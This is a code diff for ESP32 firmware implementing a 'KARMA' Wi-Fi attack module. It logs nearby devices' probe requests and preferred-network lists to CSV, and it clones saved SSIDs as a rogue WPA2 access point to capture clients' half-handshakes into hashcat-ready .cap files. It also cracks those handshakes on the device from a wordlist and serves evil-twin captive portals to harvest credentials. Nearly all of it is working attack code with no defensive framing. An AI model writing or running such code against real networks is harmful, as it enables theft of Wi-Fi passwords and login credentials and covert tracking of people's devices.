@@ -23,6 +23,8 @@
 #include "pcap_writer.h"      // shared libpcap writer
 #include "captive_portal.h"  // shared open/WPA2 portal + cred capture
 #include "wpa_crack.h"        // shared PBKDF2 / handshake-MIC dictionary crack
+#include "rogue_handshake.h"  // manual rogue-AP WPA2 half-handshake engine
+#include "wifi_sd_guard.h"    // ScopedPromiscPause — GDMA-safe mid-promiscuous SD writes
 #include <Arduino.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -74,6 +76,10 @@ struct KmDevice { uint8_t rep[6]; uint8_t macCount; uint16_t pnl[KM_PNL_MAX]; ui
 static KmMac*    s_macs = nullptr;
 static KmDevice* s_devs = nullptr;
 static int       s_macCount = 0, s_devCount = 0;
+
+// transient "Saved NNN.csv" confirmation shown in the harvest footer
+static uint32_t  s_saveNoticeMs = 0;
+static char      s_saveNotice[28] = {0};
 
 // ── promiscuous probe-request callback ─────────────────────────────────────────
 static void IRAM_ATTR karmaRxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
@@ -380,8 +386,11 @@ static void drawNets(uint8_t ch, int page, int sel) {
     dm.setCursor(0, baseY + KM_RPP * LINE_HEIGHT + 2);
     dm.printSeparator();
     dm.setCursor(4, dm.getCursorY());
-    dm.setTextColor(0x7BEF);
-    dm.println("[h]hs [p]portal [v]devs [q]stop");
+    if (millis() - s_saveNoticeMs < 2500) {
+        dm.setTextColor(TFT_GREEN); dm.println(s_saveNotice);
+    } else {
+        dm.setTextColor(0x7BEF); dm.println("[h]hs [p]portal [s]save [v]devs [q]stop");
+    }
 }
 
 // Sort devices by PNL size desc (richest fingerprint first), then RSSI.
@@ -491,58 +500,24 @@ static void drawDevices(int page, int sel) {
 
     dm.printSeparator();
     dm.setCursor(4, dm.getCursorY());
-    dm.setTextColor(0x7BEF);
-    dm.println("[h]hs [p]portal [v]nets [q]stop");
-}
-
-// ════════════════════════════════════════════════════════════════════════════════
-// Phase 3 — WPA2 handshake bait (save-only)
-// Clone the target SSID as a WPA2 soft-AP with a throwaway PSK. A client that has
-// the real network saved auto-joins and sends M1/M2; the M2 MIC is keyed by the
-// REAL password (half handshake) → crackable offline. We never finish the handshake
-// (wrong PSK, nothing connects); we just sniff our own beacon + the EAPOL frames and
-// write an aircrack/hashcat-ready .cap. No deauth, no real AP needed.
-// ════════════════════════════════════════════════════════════════════════════════
-#define KM_HS_MAX    16      // frames retained (beacon + M1..M4 + a few retries)
-#define KM_HS_FRAME 384      // max bytes per frame
-
-struct KmHsFrame { uint16_t len; uint32_t ts; uint8_t data[KM_HS_FRAME]; };
-static KmHsFrame*        s_hs = nullptr;       // INTERNAL DRAM — ISR writes, never PSRAM
-static volatile int      s_hsCount = 0;
-static volatile uint32_t s_hsEapol = 0, s_hsBeacons = 0;
-static volatile bool     s_hsCapturing = false, s_hsHaveBeacon = false, s_hsGotM2 = false;
-static uint8_t           s_hsBssid[6];         // our soft-AP MAC (capture filter)
-static volatile uint8_t  s_hsSta[6];
-
-static void IRAM_ATTR karmaHsCb(void* buf, wifi_promiscuous_pkt_type_t t) {
-    if (!s_hsCapturing || s_hsCount >= KM_HS_MAX) return;
-    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
-    const uint8_t* d = p->payload;
-    uint16_t len = p->rx_ctrl.sig_len;
-    if (len < 24) return;
-    bool keep = false;
-
-    if (dot11::fType(d) == 0 && dot11::fSubtype(d) == dot11::ST_BEACON) {     // beacon — keep one, ours
-        if (!s_hsHaveBeacon && memcmp(d + 16, s_hsBssid, 6) == 0) {
-            keep = true; s_hsHaveBeacon = true; s_hsBeacons++;
-        }
-    } else {                                                                   // data — EAPOL?
-        dot11::Eapol ev;
-        if (dot11::parseEapol(d, len, ev) && memcmp(dot11::dataBssid(d), s_hsBssid, 6) == 0) {
-            keep = true; s_hsEapol++;
-            if (ev.msg == 2) { s_hsGotM2 = true; memcpy((void*)s_hsSta, d + 10, 6); }  // M2 = SNonce+MIC
-        }
+    if (millis() - s_saveNoticeMs < 2500) {
+        dm.setTextColor(TFT_GREEN); dm.println(s_saveNotice);
+    } else {
+        dm.setTextColor(0x7BEF); dm.println("[h]hs [p]portal [s]save [v]nets [q]stop");
     }
-    if (!keep) return;
-    int i = s_hsCount;
-    if (i >= KM_HS_MAX) return;
-    KmHsFrame& f = (KmHsFrame&)s_hs[i];
-    uint16_t cl = len < KM_HS_FRAME ? len : KM_HS_FRAME;
-    memcpy(f.data, d, cl);
-    f.len = cl; f.ts = millis();
-    s_hsCount = i + 1;
 }
 
+// ════════════════════════════════════════════════════════════════════════════════
+// Phase 3 — WPA2 rogue-AP half-handshake (manual EAPOL responder)
+// We are the AP, so we GENERATE the ANonce and inject our own M1 — no need to
+// capture M1 over the air (ESP32 can't hear its own TX). A client that has the
+// real network saved associates to our cloned WPA2 SSID and replies M2, whose MIC
+// is keyed by the REAL password (half handshake). With our known ANonce + the
+// sniffed M2 it cracks offline. All the AP-side frames are injected by the
+// roguehs engine (rogue_handshake.cpp). See .claude/memory project_karma_rogue_handshake.
+// ════════════════════════════════════════════════════════════════════════════════
+
+// Make an SSID safe to use as a filename.
 static void sanitizeSsid(const char* ssid, char* out, size_t n) {
     size_t j = 0;
     for (size_t i = 0; ssid[i] && j < n - 1; i++) {
@@ -554,57 +529,143 @@ static void sanitizeSsid(const char* ssid, char* out, size_t n) {
     if (j == 0) strncpy(out, "ssid", n);
 }
 
-// On-device dictionary crack of the captured half-handshake. Extracts M1/M2 crypto
-// material from the still-allocated s_hs[] frames, then runs the shared cracker over
-// the SD wordlist (/apps/karma/wordlist.txt) and the built-in list. Must be called
-// AFTER AP teardown (SD safe) and BEFORE s_hs is freed.
-static void karmaCrack(const char* ssid) {
-    DisplayManager& dm = displayManager;
+// Write an aircrack/hashcat-ready .cap of the rogue half-handshake: beacon (carries
+// the ESSID/BSSID) + the M1 we injected (our ANonce) + the client's sniffed M2. The
+// M1 replay counter (1) matches the counter the client echoes in M2, so the tools
+// pair them into a crackable hash. Overwrites /apps/karma/<ssid>.cap. Call AFTER the
+// engine teardown (GDMA-safe). Returns true if a file was written.
+static bool karmaSaveCap(const char* ssid, const roguehs::State& s) {
+    if (!sdCardManager.canAccessSD() || !s.gotM2 || !s.m2RawLen) return false;
+    sdCardManager.ensureDir(SD_DIR_KARMA);
+    char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
+    char fname[80]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s.cap", safe);
+    File cap = SD.open(fname, FILE_WRITE);   // overwrite any prior capture for this SSID
+    if (!cap) return false;
+    pcap::writeGlobalHeader(cap);
+    uint32_t t = s.capTs ? s.capTs : millis();
+    if (s.beaconLen) pcap::writeRecord(cap, s.beacon, s.beaconLen, t > 20 ? t - 20 : 0);
+    if (s.m1RawLen)  pcap::writeRecord(cap, s.m1Raw,  s.m1RawLen,  t > 10 ? t - 10 : 0);
+    pcap::writeRecord(cap, s.m2Raw, s.m2RawLen, t);
+    cap.flush(); cap.close();
+    return true;
+}
 
-    // pull aNonce (M1) + sNonce/MIC/EAPOL (M2) out of the captured frames
-    uint8_t aNonce[32], sNonce[32], mic[16], eapol[256];
-    uint16_t eapolLen = 0;
-    bool haveM1 = false, haveM2 = false;
-    for (int i = 0; i < s_hsCount; i++) {
-        dot11::Eapol ev;
-        if (!dot11::parseEapol(s_hs[i].data, s_hs[i].len, ev)) continue;
-        if (ev.msg == 1 && !haveM1 && ev.len >= 49) {
-            memcpy(aNonce, ev.p + 17, 32); haveM1 = true;
-        } else if (ev.msg == 2 && !haveM2 && ev.len >= 97) {
-            uint16_t el = ((ev.p[2] << 8) | ev.p[3]) + 4;
-            if (el > ev.len)          el = ev.len;
-            if (el > sizeof(eapol))   el = sizeof(eapol);
-            memcpy(sNonce, ev.p + 17, 32);
-            memcpy(mic,    ev.p + 81, 16);
-            memcpy(eapol,  ev.p, el);
-            memset(eapol + 81, 0, 16);     // MIC field must be zero for the HMAC
-            eapolLen = el; haveM2 = true;
+// Copy `in` into `out`, neutralising CSV-breaking chars (comma/newline → space).
+static const char* csvSafe(const char* in, char* out, size_t n) {
+    size_t j = 0;
+    for (size_t i = 0; in[i] && j < n - 1; i++) {
+        char c = in[i];
+        out[j++] = (c == ',' || c == '\n' || c == '\r') ? ' ' : c;
+    }
+    out[j] = '\0';
+    return out;
+}
+
+// Next free sequential number for /apps/karma/NNN.csv (never overwrites; same
+// scheme as wguard/bmon). Scans the dir for files named exactly "NNN.csv".
+static int nextKarmaSeq() {
+    int maxN = 0;
+    File dir = SD.open(SD_DIR_KARMA);
+    if (dir && dir.isDirectory()) {
+        for (File f = dir.openNextFile(); f; f = dir.openNextFile()) {
+            const char* nm = f.name();
+            const char* b = strrchr(nm, '/'); b = b ? b + 1 : nm;
+            if (strlen(b) == 7 && b[0] >= '0' && b[0] <= '9' && b[1] >= '0' && b[1] <= '9' &&
+                b[2] >= '0' && b[2] <= '9' && strcasecmp(b + 3, ".csv") == 0) {
+                int v = (b[0] - '0') * 100 + (b[1] - '0') * 10 + (b[2] - '0');
+                if (v > maxN) maxN = v;
+            }
+            f.close();
         }
     }
+    if (dir) dir.close();
+    return maxN + 1;
+}
 
-    dm.clearScreen();
-    dm.setCursor(4, outputY);
-    dm.setTextColor(0x7BEF); dm.printText("[");
-    dm.setTextColor(TFT_CYAN); dm.printText("KRMA");
-    dm.setTextColor(0x7BEF); dm.printText("::");
-    dm.setTextColor(TFT_YELLOW); dm.printText("CRACK");
-    dm.setTextColor(0x7BEF); dm.println("]");
-    dm.printSeparator();
+// Save the current harvest (SSID table) + fingerprinted devices to a sequential
+// /apps/karma/NNN.csv (one file, [NETS] + [DEVICES] sections). GDMA-safe: pauses
+// promiscuous around all SD I/O. Returns the sequence number, or -1 on failure.
+static int karmaSaveTables() {
+    if (!sdCardManager.canAccessSD()) return -1;
+    rebuildDevices();                          // refresh DEVICES even if HARV view is up
+    ScopedPromiscPause _pause;                 // GDMA: pause promiscuous around SD I/O
+    sdCardManager.ensureDir(SD_DIR_KARMA);
+    int seq = nextKarmaSeq();
+    char fname[48]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%03d.csv", seq);
+    File f = SD.open(fname, FILE_WRITE);
+    if (!f) return -1;
 
-    if (!haveM1 || !haveM2) {
-        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_RED);
-        dm.println("Need M1+M2 to crack.");
-        return;
+    char buf[40];
+    f.printf("# KARMA harvest %03d  probes=%lu ssids=%d devices=%d\n",
+             seq, (unsigned long)s_totalProbes, s_netCount, s_devCount);
+
+    f.println("[NETS]");
+    f.println("ssid,devices,hits,rssi,channel");
+    int no[KM_NET_MAX]; buildOrder(no, s_netCount);
+    for (int i = 0; i < s_netCount; i++) {
+        const KmNet& n = s_nets[no[i]];
+        f.printf("%s,%u,%lu,%d,%u\n", csvSafe(n.ssid, buf, sizeof(buf)),
+                 n.devs, (unsigned long)n.hits, n.rssi, n.ch);
     }
 
-    uint8_t apMac[6], staMac[6];
-    memcpy(apMac, s_hsBssid, 6);
-    memcpy(staMac, (const void*)s_hsSta, 6);
+    f.println("[DEVICES]");
+    f.println("id,vendor,type,macs,randomized,pnl_count,rssi,pnl");
+    int dvo[KM_DEV_MAX]; buildDevOrder(dvo, s_devCount);
+    for (int i = 0; i < s_devCount; i++) {
+        const KmDevice& d = s_devs[dvo[i]];
+        f.printf("%d,%s,%s,%u,%d,%u,%d,", i, d.vendor ? d.vendor : "?",
+                 d.type ? d.type : "?", d.macCount, d.randomized ? 1 : 0, d.pnlCount, d.rssi);
+        for (int k = 0; k < d.pnlCount; k++) {                  // PNL joined by ';'
+            const char* nm = (d.pnl[k] < (uint16_t)s_netCount) ? s_nets[d.pnl[k]].ssid : "?";
+            f.print(csvSafe(nm, buf, sizeof(buf)));
+            if (k + 1 < d.pnlCount) f.print(';');
+        }
+        f.print('\n');
+    }
+    f.flush(); f.close();
+    return seq;
+}
+
+// On-device dictionary crack of the rogue half-handshake. We pass in the known
+// ANonce (we chose it as the AP) plus the sniffed M2 material, then run the shared
+// cracker over the SD wordlist (/apps/karma/wordlist.txt) and the built-in list.
+// Call AFTER the engine teardown (SD safe).
+static void karmaCrack(const char* ssid, const uint8_t apMac[6], const uint8_t staMac[6],
+                       const uint8_t aNonce[32], const uint8_t sNonce[32],
+                       const uint8_t* eapol, uint16_t eapolLen, const uint8_t mic[16],
+                       bool capSaved) {
+    DisplayManager& dm = displayManager;
+
+    auto drawCrackHeader = [&]() {
+        dm.clearScreen();
+        dm.setCursor(4, outputY);
+        dm.setTextColor(0x7BEF); dm.printText("[");
+        dm.setTextColor(TFT_CYAN); dm.printText("KRMA");
+        dm.setTextColor(0x7BEF); dm.printText("::");
+        dm.setTextColor(TFT_YELLOW); dm.printText("CRACK");
+        dm.setTextColor(0x7BEF); dm.println("]");
+        dm.printSeparator();
+    };
+    drawCrackHeader();
 
     const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
     mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);
 
-    bool useSD = sdCardManager.canAccessSD() && SD.exists(SD_DIR_KARMA "/wordlist.txt");
+    // ── Wordlist source picker (mirrors ws): only prompt if an SD list exists ──
+    bool hasWl = sdCardManager.canAccessSD() && SD.exists(SD_DIR_KARMA "/wordlist.txt");
+    bool useSD = hasWl;
+    if (hasWl) {
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(TFT_GREEN);  dm.println("[1] /apps/karma/wordlist.txt (SD)");
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(0x7BEF);     dm.println("[2] Built-in (100 pwds)");
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(TFT_WHITE);  dm.println("Choose source:");
+        char c = 0;
+        while (c != '1' && c != '2') { c = inputHandler.getKeyboardInput(); vTaskDelay(1); }
+        useSD = (c == '1');
+        drawCrackHeader();   // wipe the picker so crack status starts clean
+    }
     dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
     dm.println(useSD ? "Source: SD wordlist" : "Source: built-in (100)");
     int32_t statY = dm.getCursorY();
@@ -672,6 +733,19 @@ static void karmaCrack(const char* ssid) {
     } else {
         dm.setTextColor(TFT_YELLOW); dm.println("Not in wordlist.");
     }
+
+    // Whether or not we cracked it, the half-handshake .cap is already on the SD —
+    // tell the user where, so a failed/aborted on-device crack can move to a PC.
+    if (capSaved) {
+        char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
+        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
+        char cp[64]; snprintf(cp, sizeof(cp), ".cap: /apps/karma/%.20s.cap", safe);
+        dm.println(cp);
+        if (!done) {
+            dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
+            dm.println("Move to PC for aircrack/hashcat");
+        }
+    }
 }
 
 // interactive=true → called from the live harvest list: show result, wait for a
@@ -679,120 +753,96 @@ static void karmaCrack(const char* ssid) {
 static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) {
     DisplayManager& dm = displayManager;
 
-    // capture buffer in INTERNAL DRAM (the ISR writes into it — must not be PSRAM)
-    s_hs = (KmHsFrame*)heap_caps_malloc((size_t)KM_HS_MAX * sizeof(KmHsFrame),
-                                        MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
-    if (!s_hs) {
+    if (!roguehs::begin(ssid, channel)) {
         dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
-        dm.println("Karma: capture buffer alloc failed");
-        dm.printCommandScreen(); return;
+        dm.println("Karma: rogue-AP start failed");
+        if (interactive) {
+            dm.setCursor(4, dm.getCursorY());
+            dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
+            while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
+        } else dm.printCommandScreen();
+        return;
     }
-    s_hsCount = 0; s_hsEapol = 0; s_hsBeacons = 0;
-    s_hsHaveBeacon = false; s_hsGotM2 = false; s_hsCapturing = false;
-    memset((void*)s_hsSta, 0, 6);
-
-    // open .cap before WiFi (GDMA) — named by SSID (our BSSID isn't known until AP up)
-    bool fileOk = false; File cap;
-    if (sdCardManager.isReady()) {
-        sdCardManager.ensureDir(SD_DIR_KARMA);
-        char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
-        char fname[80]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s.cap", safe);
-        cap = SD.open(fname, FILE_WRITE);
-        fileOk = (bool)cap;
-        if (fileOk) pcap::writeGlobalHeader(cap);
-    }
-
-    // WPA2 soft-AP cloning the SSID (throwaway PSK) + promiscuous beacon/EAPOL sniff
-    WiFi.disconnect(false);
-    WiFi.mode(WIFI_MODE_APSTA);
-    WiFi.softAP(ssid, "trexkarma", channel, 0, 4, false);
-    delay(150);
-    esp_wifi_get_mac(WIFI_IF_AP, s_hsBssid);
-
-    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
-    esp_wifi_set_promiscuous_filter(&filt);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(karmaHsCb);
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    s_hsCapturing = true;
 
     uint32_t lastDraw = 0;
-    bool redraw = true;
-    bool crackReq = false;
+    bool redraw = true, crackReq = false;
     while (true) {
+        roguehs::poll();                                  // re-beacon + answer clients
+        const roguehs::State& s = roguehs::state();
+
         if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;
         uint32_t now = millis();
         if ((redraw || now - lastDraw > 400) && !dm.isBlocked()) {
             drawHeader("WPA2", 0, 0);
             dm.setCursor(4, dm.getCursorY());
             dm.setTextColor(0x7BEF); dm.printText("SSID "); dm.setTextColor(TFT_WHITE);
-            char s[34]; snprintf(s, sizeof(s), "%.31s", ssid); dm.println(s);
+            char ss[34]; snprintf(ss, sizeof(ss), "%.31s", ssid); dm.println(ss);
             dm.setCursor(4, dm.getCursorY());
-            dm.setTextColor(0x7BEF); dm.printText("CH ");   dm.setTextColor(TFT_WHITE);
+            dm.setTextColor(0x7BEF); dm.printText("BSSID "); dm.setTextColor(TFT_WHITE);
+            char bm[20]; snprintf(bm, sizeof(bm), "%02X:%02X:%02X:%02X:%02X:%02X",
+                s.apMac[0], s.apMac[1], s.apMac[2], s.apMac[3], s.apMac[4], s.apMac[5]);
+            dm.printText(bm);
+            dm.setTextColor(0x7BEF); dm.printText("  CH "); dm.setTextColor(TFT_WHITE);
             char c[6]; snprintf(c, sizeof(c), "%u", channel); dm.println(c);
-            dm.setCursor(4, dm.getCursorY());
-            dm.setTextColor(0x7BEF); dm.printText("SD ");
-            dm.setTextColor(fileOk ? TFT_GREEN : TFT_RED);
-            dm.println(fileOk ? "saving .cap" : "none (RAM only)");
             dm.printSeparator();
+            // live stage diagnostic — shows how far each client gets
             dm.setCursor(4, dm.getCursorY());
-            char st[44]; snprintf(st, sizeof(st), "EAPOL:%lu  Beacon:%lu",
-                                  (unsigned long)s_hsEapol, (unsigned long)s_hsBeacons);
+            char st[48]; snprintf(st, sizeof(st), "Prb:%lu Ath:%lu Asc:%lu M1:%lu",
+                (unsigned long)s.probes, (unsigned long)s.auths,
+                (unsigned long)s.assocs, (unsigned long)s.m1Sent);
             dm.setTextColor(TFT_WHITE); dm.println(st);
             dm.setCursor(4, dm.getCursorY());
-            if (s_hsGotM2) {
-                char m[46]; snprintf(m, sizeof(m), "[M2] %02X:%02X:%02X:%02X:%02X:%02X",
-                    s_hsSta[0], s_hsSta[1], s_hsSta[2], s_hsSta[3], s_hsSta[4], s_hsSta[5]);
+            if (s.gotM2) {
+                char m[46]; snprintf(m, sizeof(m), "M2! STA %02X:%02X:%02X:%02X:%02X:%02X",
+                    s.staMac[0], s.staMac[1], s.staMac[2], s.staMac[3], s.staMac[4], s.staMac[5]);
                 dm.setTextColor(TFT_GREEN); dm.println(m);
+            } else if (s.assocs) {
+                dm.setTextColor(TFT_YELLOW); dm.println("Associated - awaiting M2...");
             } else {
-                dm.setTextColor(0x4208); dm.println("Waiting for client...");
+                dm.setTextColor(0x4208); dm.println("Baiting - waiting for client...");
             }
             dm.printSeparator();
             dm.setCursor(4, dm.getCursorY());
             dm.setTextColor(0x7BEF);
-            dm.println(s_hsGotM2 ? "[c] crack  [q] stop" : "[q] stop");
+            dm.println(s.gotM2 ? "[c] crack  [q] stop" : "[q] stop");
             lastDraw = now; redraw = false;
         }
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if ((k == 'c' || k == 'C') && s_hsGotM2) { crackReq = true; break; }
-        vTaskDelay(pdMS_TO_TICKS(20));
+        if ((k == 'c' || k == 'C') && s.gotM2) { crackReq = true; break; }
+        vTaskDelay(pdMS_TO_TICKS(5));
     }
 
-    // teardown — stop capture + AP + promiscuous BEFORE any SD write (GDMA rule)
-    s_hsCapturing = false;
-    esp_wifi_set_promiscuous(false);
-    esp_wifi_set_promiscuous_rx_cb(nullptr);
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_STA);
+    // bring WiFi down first (SD-safe), then read the result. state() stays valid
+    // after end() (the static isn't cleared until the next begin()), so a reference
+    // avoids copying the now ~1KB State onto the stack.
+    roguehs::end();
     delay(50);
+    const roguehs::State& snap = roguehs::state();
 
-    int written = 0;
-    if (fileOk) {
-        int n = s_hsCount;
-        for (int i = 0; i < n; i++) {
-            pcap::writeRecord(cap, s_hs[i].data, s_hs[i].len, s_hs[i].ts);
-            written++;
-        }
-        cap.flush(); cap.close();
-    }
+    // aircrack/hashcat-ready .cap: beacon (ESSID) + injected M1 + sniffed M2.
+    bool capSaved = karmaSaveCap(ssid, snap);
 
-    // [c] → crack now (reads s_hs frames, so do it BEFORE freeing them)
     bool didCrack = false;
-    if (crackReq && s_hsGotM2) { karmaCrack(ssid); didCrack = true; }
-
-    heap_caps_free(s_hs); s_hs = nullptr;
+    if (crackReq && snap.gotM2) {
+        karmaCrack(ssid, snap.apMac, snap.staMac, snap.anonce, snap.snonce,
+                   snap.eapol, snap.eapolLen, snap.mic, capSaved);
+        didCrack = true;
+    }
 
     if (!didCrack) {
         dm.clearScreen();
         dm.setCursor(4, outputY);
-        if (s_hsGotM2) { dm.setTextColor(TFT_GREEN);  dm.println("Handshake (M2) captured!"); }
-        else           { dm.setTextColor(TFT_YELLOW); dm.println("No M2 captured."); }
+        if (snap.gotM2) { dm.setTextColor(TFT_GREEN);  dm.println("Half-handshake (M2) captured!"); }
+        else            { dm.setTextColor(TFT_YELLOW); dm.println("No M2 captured."); }
         dm.setCursor(4, dm.getCursorY());
-        char r[60];
-        if (fileOk) snprintf(r, sizeof(r), "Saved %d frames to /apps/karma", written);
-        else        snprintf(r, sizeof(r), "%d frames in RAM (no SD)", s_hsCount);
-        dm.setTextColor(TFT_WHITE); dm.println(r);
+        dm.setTextColor(TFT_WHITE);
+        if (snap.gotM2) dm.println("ANonce known - [c] to crack");
+        else            dm.println("No client completed the handshake");
+        if (capSaved) {
+            dm.setCursor(4, dm.getCursorY());
+            dm.setTextColor(TFT_CYAN); dm.println("Saved .cap to /apps/karma");
+        }
     }
 
     if (interactive) {
@@ -823,9 +873,10 @@ static void karmaPortal(const char* ssid, bool interactive) {
     }
 
     // Pick the page (built-ins + SD .html) before the AP comes up (SD read is idle/safe).
+    // Scan karma's own portal dir AND eviltwin's — so templates dropped in either work.
     char tplLabel[24] = "Generic WiFi";
     CpChoice ch;
-    if (cpPickTemplate(SD_DIR_KARMA_PORTAL, ch)) {
+    if (cpPickTemplate(SD_DIR_KARMA_PORTAL, ch, SD_DIR_EVILPORTAL)) {
         if (ch.builtin >= 0) {
             cp->useBuiltin(ch.builtin);
             snprintf(tplLabel, sizeof(tplLabel), "%.23s", cpBuiltinName(ch.builtin));
@@ -1016,6 +1067,14 @@ void runKarma(char* args) {
         if (k == 'c' || k == 'C') {
             s_recCount = s_netCount = s_macCount = s_devCount = 0;
             s_totalProbes = 0; netPage = netSel = devPage = devSel = 0; redraw = true;
+        }
+        if (k == 's' || k == 'S') {                 // save harvest + devices → NNN.csv
+            int seq = karmaSaveTables();
+            if (seq >= 0) snprintf(s_saveNotice, sizeof(s_saveNotice), "Saved %03d.csv", seq);
+            else          snprintf(s_saveNotice, sizeof(s_saveNotice), "Save failed (no SD)");
+            s_saveNoticeMs = millis();
+            lastHop = millis();                     // skip a hop after the promiscuous pause
+            redraw = true;
         }
 
         // ── [h] handshake / [p] portal → bait the selected target, then resume ──
